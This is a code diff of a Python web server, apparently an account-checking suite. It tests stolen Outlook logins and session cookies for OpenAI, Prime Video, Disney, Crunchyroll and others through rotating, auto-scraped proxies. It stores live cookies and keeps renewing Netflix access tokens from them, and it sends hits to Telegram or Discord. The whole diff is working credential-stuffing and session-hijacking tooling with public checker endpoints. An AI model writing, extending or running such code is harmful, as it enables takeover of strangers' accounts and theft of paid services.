                     "healthy_count": healthy_all,
+                    "dead": dead_all,
                     "dead_count": dead_all,
+                    "cooldown": cooldown_all,
+                    "cooldown_count": cooldown_all,
+                    "unverified": unverified_all,
                     "unverified_count": unverified_all,
+                    "active": active_all,
                     "active_count": active_all,
                     "avg_latency": avg_latency,
                     "filtered_total": filtered_total,
@@ -3280,7 +4682,10 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     "limit": limit,
                     "total_pages": total_pages,
                     "testing": t_info.get("running", False),
+                    "test_info": t_info,
                     "test_progress": t_info,
+                    "items": items_page,
+                    "proxies": items_page,
                     "list": items_page
                 }
                 self.send_response(200)
@@ -3289,11 +4694,36 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(json.dumps(res_payload).encode("utf-8"))
 
+            elif path == "/api/proxies/provider-config":
+                cfg = get_config()
+                p_cfg = dict(cfg.get("proxy_provider", {}))
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": True, "provider": p_cfg}).encode("utf-8"))
+
+            elif path == "/api/notifications/config":
+                cfg = get_config()
+                n_cfg = json.loads(json.dumps(cfg.get("notifications", {})))
+                if "telegram" in n_cfg and n_cfg["telegram"].get("bot_token"):
+                    tok = n_cfg["telegram"]["bot_token"]
+                    n_cfg["telegram"]["bot_token_masked"] = (tok[:4] + "..." + tok[-4:]) if len(tok) > 8 else "***"
+                    del n_cfg["telegram"]["bot_token"]
+                if "discord" in n_cfg and n_cfg["discord"].get("webhook_url"):
+                    wh = n_cfg["discord"]["webhook_url"]
+                    n_cfg["discord"]["webhook_url_masked"] = (wh[:15] + "..." + wh[-6:]) if len(wh) > 25 else "***"
+                    del n_cfg["discord"]["webhook_url"]
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": True, "notifications": n_cfg}).encode("utf-8"))
+
             elif path == "/api/proxies/export":
                 mode = qs.get("mode", ["healthy"])[0].lower()
+                load_proxies()  # Pre-load outside lock to avoid deadlock
                 with proxy_lock:
-                    if not all_tested_proxies:
-                        all_tested_proxies = list(load_proxies())
                     p_list = list(all_tested_proxies)
                 if mode == "healthy":
                     lines = [p.get("line") or p.get("proxy") for p in p_list if p.get("status") == "OK"]
@@ -3354,7 +4784,10 @@ class Handler(http.server.BaseHTTPRequestHandler):
                         s_data = sf.read()
                     self.send_response(200)
                     self.send_header("Content-Type", ctype)
-                    self.send_header("Cache-Control", "public, max-age=3600")
+                    if ext == ".html":
+                        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+                    else:
+                        self.send_header("Cache-Control", "public, max-age=3600")
                     self.send_cors_headers()
                     self.end_headers()
                     self.wfile.write(s_data)
@@ -3416,12 +4849,11 @@ class Handler(http.server.BaseHTTPRequestHandler):
             if self.path == "/api/admin/keys":
                 action = p.get("action", "")
                 if action == "list":
-                    with db_lock:
-                        conn = get_db()
-                        c = conn.cursor()
-                        c.execute('SELECT id, key, label, created_at, last_used, is_active FROM api_keys')
-                        rows = c.fetchall()
-                        conn.close()
+                    conn = get_db()
+                    c = conn.cursor()
+                    c.execute('SELECT id, key, label, created_at, last_used, is_active FROM api_keys')
+                    rows = c.fetchall()
+                    conn.close()
                     keys_list = []
                     for r in rows:
                         masked = r[1][:8] + '...' + r[1][-4:] if len(r[1]) > 12 else '****'
@@ -3432,14 +4864,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     new_key = _secrets.token_hex(16)
                     label = str(p.get("label", "")).strip() or "Unnamed Key"
                     now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                    with db_lock:
-                        conn = get_db()
-                        c = conn.cursor()
-                        c.execute('INSERT INTO api_keys (key, label, created_at, is_active) VALUES (?, ?, ?, 1)', (new_key, label, now_str))
-                        new_id = c.lastrowid
-                        conn.commit()
-                        conn.close()
-                    result = {"id": new_id, "key": new_key, "label": label, "created_at": now_str}
+                    res = execute_db_write_sync("create_api_key", {
+                        "key": new_key,
+                        "label": label,
+                        "created_at": now_str
+                    })
+                    result = res
                 elif action == "revoke":
                     key_id = p.get("id")
                     if not key_id:
@@ -3449,12 +4879,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                         self.end_headers()
                         self.wfile.write(b'{"error": "Missing id"}')
                         return
-                    with db_lock:
-                        conn = get_db()
-                        c = conn.cursor()
-                        c.execute('UPDATE api_keys SET is_active = 0 WHERE id = ?', (key_id,))
-                        conn.commit()
-                        conn.close()
+                    execute_db_write_sync("revoke_api_key", {"id": key_id})
                     result = {"ok": True, "revoked": key_id}
                 elif action == "delete":
                     key_id = p.get("id")
@@ -3465,12 +4890,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                         self.end_headers()
                         self.wfile.write(b'{"error": "Missing id"}')
                         return
-                    with db_lock:
-                        conn = get_db()
-                        c = conn.cursor()
-                        c.execute('DELETE FROM api_keys WHERE id = ?', (key_id,))
-                        conn.commit()
-                        conn.close()
+                    execute_db_write_sync("delete_api_key", {"id": key_id})
                     result = {"ok": True, "deleted": key_id}
                 else:
                     self.send_response(400)
@@ -3533,12 +4953,11 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     except Exception:
                         mem = 0
                     db_size = os.path.getsize(DB_FILE) if os.path.exists(DB_FILE) else 0
-                    with db_lock:
-                        conn = get_db()
-                        c = conn.cursor()
-                        c.execute('SELECT COUNT(*) FROM history')
-                        hist_count = c.fetchone()[0]
-                        conn.close()
+                    conn = get_db()
+                    c = conn.cursor()
+                    c.execute('SELECT COUNT(*) FROM history')
+                    hist_count = c.fetchone()[0]
+                    conn.close()
                     with proxy_lock:
                         proxy_count = len(all_tested_proxies)
                     result = {
@@ -3582,8 +5001,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(json.dumps(result).encode("utf-8"))
 
-        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check", "/api/proxies/save", "/api/proxies/test", "/api/proxies/test/stop", "/api/proxies/test_single", "/api/proxies/add", "/api/proxies/remove", "/api/history/clear", "/api/system/reload"):
-            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check") else 50
+        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/openai/check", "/api/primevideo/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check", "/api/proxies/save", "/api/proxies/test", "/api/proxies/test/stop", "/api/proxies/test_single", "/api/proxies/add", "/api/proxies/remove", "/api/proxies/auto-scrape", "/api/proxies/scraper-status", "/api/proxies/provider-config", "/api/proxies/sync-provider", "/api/notifications/config", "/api/notifications/test", "/api/notifications/bulk-summary", "/api/history/clear", "/api/history/delete", "/api/history/recheck", "/api/system/reload", "/api/dashboard-pin/set", "/api/dashboard-pin/verify", "/api/dashboard-pin/remove"):
+            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/openai/check", "/api/primevideo/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check") else 50
             if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
@@ -3593,17 +5012,21 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.wfile.write(b'{"error": "Too Many Requests. Rate limit exceeded."}')
                 return
 
-            # Checker endpoints are public; proxy management needs API key
+            # Checker endpoints are public; proxy management needs API key or Dashboard Session
             proxy_mgmt = {"/api/proxies/save", "/api/proxies/test", "/api/proxies/test/stop",
                           "/api/proxies/test_single", "/api/proxies/add", "/api/proxies/remove",
-                          "/api/history/clear", "/api/system/reload"}
+                          "/api/proxies/auto-scrape", "/api/proxies/scraper-status",
+                          "/api/proxies/provider-config", "/api/proxies/sync-provider",
+                          "/api/notifications/config", "/api/notifications/test",
+                          "/api/history/clear", "/api/history/delete", "/api/history/recheck", "/api/system/reload",
+                          "/api/dashboard-pin/set", "/api/dashboard-pin/remove"}
             if self.path in proxy_mgmt:
-                if not check_api_key_authorized(self.headers):
+                if not check_authorized_client(self.headers):
                     self.send_response(401)
                     self.send_header("Content-Type", "application/json")
                     self.send_cors_headers()
                     self.end_headers()
-                    self.wfile.write(b'{"error": "Unauthorized: API Key required"}')
+                    self.wfile.write(b'{"error": "Unauthorized: API Key or Dashboard Session required"}')
                     return
 
             if self.path == "/api/token":
@@ -3778,6 +5201,46 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     if not email or not password:
                         raise ValueError("Email dan password wajib diisi")
                     out = check_outlook_account(email, password, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/openai/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    cookie = p.get("cookie", "").strip()
+                    if not cookie:
+                        raise ValueError("Cookie wajib diisi")
+                    out = check_openai_cookie(cookie, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/primevideo/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    cookie = p.get("cookie", "").strip()
+                    if not cookie:
+                        raise ValueError("Cookie wajib diisi")
+                    out = check_primevideo_cookie(
+                        cookie,
+                        use_proxy=p.get("use_proxy", True),
+                        get_proxy_fn=get_random_proxy,
+                        cooldown_fn=mark_proxy_cooldown,
+                        save_fn=save_history
+                    )
                     res = json.dumps(out).encode("utf-8")
                     self.send_response(200)
                 except Exception as e:
@@ -3977,6 +5440,153 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(res)
 
+            elif self.path == "/api/proxies/auto-scrape":
+                # Trigger manual auto-scrape cycle
+                def _run_scrape():
+                    run_auto_scrape()
+                    # Reload proxy pool after scrape
+                    load_proxies(force_reload=True)
+                threading.Thread(target=_run_scrape, daemon=True).start()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": True, "message": "Auto-scrape started in background"}).encode("utf-8"))
+
+            elif self.path == "/api/proxies/scraper-status":
+                status = get_scraper_status()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps(status).encode("utf-8"))
+
+            elif self.path == "/api/proxies/provider-config":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    cfg = get_config()
+                    current = cfg.get("proxy_provider", {})
+                    for k in ("enabled", "provider_name", "api_url", "auto_sync_interval_minutes"):
+                        if k in p:
+                            current[k] = p[k]
+                    cfg["proxy_provider"] = current
+                    save_config(cfg)
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": True, "provider": current}).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
+            elif self.path == "/api/proxies/sync-provider":
+                try:
+                    res = sync_provider_proxies()
+                    self.send_response(200 if res.get("ok") else 400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps(res).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(500)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
+            elif self.path == "/api/notifications/config":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    cfg = get_config()
+                    cur_notifs = cfg.get("notifications", {})
+                    if "telegram" in p:
+                        tg = p["telegram"]
+                        cur_tg = cur_notifs.setdefault("telegram", {})
+                        if "enabled" in tg: cur_tg["enabled"] = bool(tg["enabled"])
+                        if "bot_token" in tg and tg["bot_token"]: cur_tg["bot_token"] = str(tg["bot_token"]).strip()
+                        if "chat_id" in tg: cur_tg["chat_id"] = str(tg["chat_id"]).strip()
+                        if "notify_on_live" in tg: cur_tg["notify_on_live"] = bool(tg["notify_on_live"])
+                        if "notify_on_bulk_finish" in tg: cur_tg["notify_on_bulk_finish"] = bool(tg["notify_on_bulk_finish"])
+
+                    if "discord" in p:
+                        dc = p["discord"]
+                        cur_dc = cur_notifs.setdefault("discord", {})
+                        if "enabled" in dc: cur_dc["enabled"] = bool(dc["enabled"])
+                        if "webhook_url" in dc and dc["webhook_url"]: cur_dc["webhook_url"] = str(dc["webhook_url"]).strip()
+                        if "notify_on_live" in dc: cur_dc["notify_on_live"] = bool(dc["notify_on_live"])
+                        if "notify_on_bulk_finish" in dc: cur_dc["notify_on_bulk_finish"] = bool(dc["notify_on_bulk_finish"])
+
+                    cfg["notifications"] = cur_notifs
+                    save_config(cfg)
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
+            elif self.path == "/api/notifications/test":
+                try:
+                    p = json.loads(body.decode("utf-8")) if body else {}
+                    target = p.get("target", "all").lower()
+                    results = {}
+
+                    if target in ("all", "telegram"):
+                        tg_ok, tg_msg = send_telegram_alert(
+                            "🧪 <b>[NF-Sawava Test Alert]</b>\nNotifikasi Telegram Bot berhasil terhubung ke NF-Sawava Suite!"
+                        )
+                        results["telegram"] = {"ok": tg_ok, "message": tg_msg}
+
+                    if target in ("all", "discord"):
+                        fields = [
+                            {"name": "Status", "value": "Connected", "inline": True},
+                            {"name": "Environment", "value": "Production", "inline": True}
+                        ]
+                        dc_ok, dc_msg = send_discord_alert(
+                            "🧪 [NF-Sawava Test Alert]",
+                            "Webhook Discord berhasil terhubung ke NF-Sawava Suite!",
+                            fields=fields,
+                            color=0x3B82F6
+                        )
+                        results["discord"] = {"ok": dc_ok, "message": dc_msg}
+
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": True, "results": results}).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
+            elif self.path == "/api/notifications/bulk-summary":
+                try:
+                    p = json.loads(body.decode("utf-8")) if body else {}
+                    dispatch_bulk_notification(p)
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
             elif self.path == "/api/system/reload":
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
@@ -3985,8 +5595,100 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.wfile.write(b'{"status": "reloading"}')
                 def _do_exit():
                     time.sleep(0.5)
+                    flush_db_queue(timeout=2.0)
                     os._exit(0)
                 threading.Thread(target=_do_exit, daemon=True).start()
+
+            elif self.path == "/api/dashboard-pin/set":
+                try:
+                    payload = json.loads(body.decode("utf-8")) if body else {}
+                except Exception:
+                    payload = {}
+                new_pin = str(payload.get("pin", "")).strip()
+                if not new_pin or len(new_pin) < 4:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"status": "error", "reason": "PIN minimal 4 karakter"}).encode("utf-8"))
+                else:
+                    import hashlib
+                    pin_hash = hashlib.sha256(new_pin.encode()).hexdigest()
+                    cfg = get_config()
+                    cfg["dashboard_pin"] = pin_hash
+                    save_config(cfg)
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"status": "ok", "message": "Dashboard PIN berhasil diset"}).encode("utf-8"))
+
+            elif self.path == "/api/dashboard-pin/verify":
+                try:
+                    payload = json.loads(body.decode("utf-8")) if body else {}
+                except Exception:
+                    payload = {}
+                pin_input = str(payload.get("pin", "")).strip()
+                cfg = get_config()
+                stored_hash = cfg.get("dashboard_pin", "")
+                if not stored_hash:
+                    # No PIN set, always pass
+                    session_token = create_dashboard_session_token()
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"status": "ok", "valid": True, "token": session_token}).encode("utf-8"))
+                else:
+                    import hashlib
+                    input_hash = hashlib.sha256(pin_input.encode()).hexdigest()
+                    valid = (input_hash == stored_hash)
+                    session_token = create_dashboard_session_token() if valid else ""
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"status": "ok", "valid": valid, "token": session_token}).encode("utf-8"))
+
+            elif self.path == "/api/dashboard-pin/remove":
+                cfg = get_config()
+                cfg["dashboard_pin"] = ""
+                save_config(cfg)
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "ok", "message": "Dashboard PIN dihapus"}).encode("utf-8"))
+
+            elif self.path == "/api/history/delete":
+                try:
+                    payload = json.loads(body.decode("utf-8")) if body else {}
+                except Exception:
+                    payload = {}
+                record_id = payload.get("id")
+                if not record_id:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(b'{"status": "error", "reason": "Missing id"}')
+                else:
+                    try:
+                        res = execute_db_write_sync("delete_history_id", {"id": int(record_id)})
+                        deleted = res.get("deleted", 0)
+                        self.send_response(200)
+                        self.send_header("Content-Type", "application/json")
+                        self.send_cors_headers()
+                        self.end_headers()
+                        resp = {"status": "ok", "deleted": deleted}
+                        self.wfile.write(json.dumps(resp).encode("utf-8"))
+                    except Exception as e:
+                        self.send_response(500)
+                        self.send_header("Content-Type", "application/json")
+                        self.send_cors_headers()
+                        self.end_headers()
+                        self.wfile.write(json.dumps({"status": "error", "reason": str(e)}).encode("utf-8"))
+
             elif self.path == "/api/history/clear":
                 try:
                     payload = json.loads(body.decode("utf-8")) if body else {}
@@ -3999,6 +5701,101 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"status": "cleared"}')
+
+            elif self.path == "/api/history/recheck":
+                try:
+                    payload = json.loads(body.decode("utf-8")) if body else {}
+                except Exception:
+                    payload = {}
+                use_proxy = payload.get("use_proxy", True)
+
+                if payload.get("bulk"):
+                    # Bulk recheck: query DB directly, no separate API call needed
+                    filter_status = payload.get("status", "all")
+                    filter_type = payload.get("type", "all")
+                    query = "SELECT id FROM history WHERE raw_cookie IS NOT NULL AND raw_cookie != ''"
+                    params_q = []
+                    if filter_status and filter_status != "all":
+                        query += " AND status = ?"
+                        params_q.append(filter_status)
+                    if filter_type and filter_type != "all":
+                        query += " AND type = ?"
+                        params_q.append(filter_type)
+                    query += " ORDER BY id DESC"
+
+                    conn = get_db()
+                    c = conn.cursor()
+                    c.execute(query, params_q)
+                    ids = [r[0] for r in c.fetchall()]
+                    conn.close()
+
+                    if not ids:
+                        self.send_response(200)
+                        self.send_header("Content-Type", "application/json")
+                        self.send_cors_headers()
+                        self.end_headers()
+                        self.wfile.write(json.dumps({"total": 0, "ok": 0, "changed": 0, "to_live": 0, "to_dead": 0, "errors": 0}).encode("utf-8"))
+                    else:
+                        from concurrent.futures import ThreadPoolExecutor
+                        def _do(rid):
+                            try:
+                                return recheck_history_item(rid, use_proxy=use_proxy)
+                            except Exception as e:
+                                return {"id": rid, "error": str(e)}
+                        with ThreadPoolExecutor(max_workers=5) as pool:
+                            results = list(pool.map(_do, ids))
+                        ok = 0; changed = 0; to_live = 0; to_dead = 0; errs = 0
+                        for r in results:
+                            if r.get("error"):
+                                errs += 1
+                            else:
+                                ok += 1
+                                if r.get("old_status") != r.get("new_status"):
+                                    changed += 1
+                                    if r.get("new_status") == "LIVE": to_live += 1
+                                    if r.get("new_status") == "DEAD": to_dead += 1
+                        self.send_response(200)
+                        self.send_header("Content-Type", "application/json")
+                        self.send_cors_headers()
+                        self.end_headers()
+                        self.wfile.write(json.dumps({"total": len(ids), "ok": ok, "changed": changed, "to_live": to_live, "to_dead": to_dead, "errors": errs}).encode("utf-8"))
+
+                elif payload.get("ids") and isinstance(payload["ids"], list):
+                    record_ids = payload["ids"]
+                    from concurrent.futures import ThreadPoolExecutor
+                    def _do_one(rid):
+                        try:
+                            return recheck_history_item(int(rid), use_proxy=use_proxy)
+                        except Exception as e:
+                            return {"id": rid, "error": str(e)}
+                    with ThreadPoolExecutor(max_workers=5) as pool:
+                        results = list(pool.map(_do_one, record_ids))
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"results": results}).encode("utf-8"))
+
+                elif payload.get("id"):
+                    try:
+                        result = recheck_history_item(int(payload["id"]), use_proxy=use_proxy)
+                        self.send_response(200)
+                        self.send_header("Content-Type", "application/json")
+                        self.send_cors_headers()
+                        self.end_headers()
+                        self.wfile.write(json.dumps(result).encode("utf-8"))
+                    except Exception as e:
+                        self.send_response(500)
+                        self.send_header("Content-Type", "application/json")
+                        self.send_cors_headers()
+                        self.end_headers()
+                        self.wfile.write(json.dumps({"error": str(e)}).encode("utf-8"))
+                else:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(b'{"error": "Missing id, ids, or bulk"}')
         else:
             self.send_response(404)
             self.send_cors_headers()
@@ -4009,31 +5806,29 @@ def session_vault_worker():
     while True:
         time.sleep(1800)
         try:
-            with db_lock:
-                conn = get_db()
-                c = conn.cursor()
-                c.execute("SELECT id, raw_cookie FROM history WHERE type IN ('netflix', 'checker', 'single', 'bulk') AND status = 'LIVE' AND raw_cookie != '' ORDER BY id DESC LIMIT 25")
-                rows = c.fetchall()
-                conn.close()
+            conn = get_db()
+            c = conn.cursor()
+            c.execute("SELECT id, raw_cookie FROM history WHERE type = 'netflix' AND status = 'LIVE' AND raw_cookie != '' ORDER BY id DESC LIMIT 25")
+            rows = c.fetchall()
+            conn.close()
 
             for row_id, raw_cookie in rows:
                 try:
                     t_url, a_url, tv_url, tok, exp, route = generate_nftoken(raw_cookie, use_proxy=True)
                     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    with db_lock:
-                        conn = get_db()
-                        conn.execute('UPDATE history SET token_url = ?, created_at = ? WHERE id = ?', (t_url, now, row_id))
-                        conn.commit()
-                        conn.close()
+                    queue_db_write("update_history_token", {
+                        "id": row_id,
+                        "token_url": t_url,
+                        "created_at": now
+                    })
                     logging.info(f"Session Vault: renewed token for history ID {row_id}")
                 except Exception as e:
                     err = str(e).lower()
                     if any(k in err for k in ("mati", "invalid", "tidak ditemukan", "401", "403")):
-                        with db_lock:
-                            conn = get_db()
-                            conn.execute('UPDATE history SET status = "DEAD" WHERE id = ?', (row_id,))
-                            conn.commit()
-                            conn.close()
+                        queue_db_write("update_history_status", {
+                            "id": row_id,
+                            "status": "DEAD"
+                        })
                         logging.warning(f"Session Vault: marked ID {row_id} as DEAD ({e})")
                     else:
                         logging.warning(f"Session Vault: renew error ID {row_id}: {e}")
@@ -4050,13 +5845,17 @@ def run():
     load_proxies(force_reload=True)
     threading.Thread(target=proxy_health_worker, daemon=True).start()
     threading.Thread(target=session_vault_worker, daemon=True).start()
+    start_auto_scraper_thread()  # Auto-scrape fresh proxies every 6h
 
     # Prevent duplicate zombie processes on Windows
     socketserver.TCPServer.allow_reuse_address = False if os.name == "nt" else True
     server = ThreadingSimpleServer(("", PORT), Handler)
     print(f"Server jalan: http://localhost:{PORT}")
     logging.info(f"Server started on port {PORT}")
-    server.serve_forever()
+    try:
+        server.serve_forever()
+    finally:
+        flush_db_queue(timeout=5.0)
 
 if __name__ == "__main__":
     run()
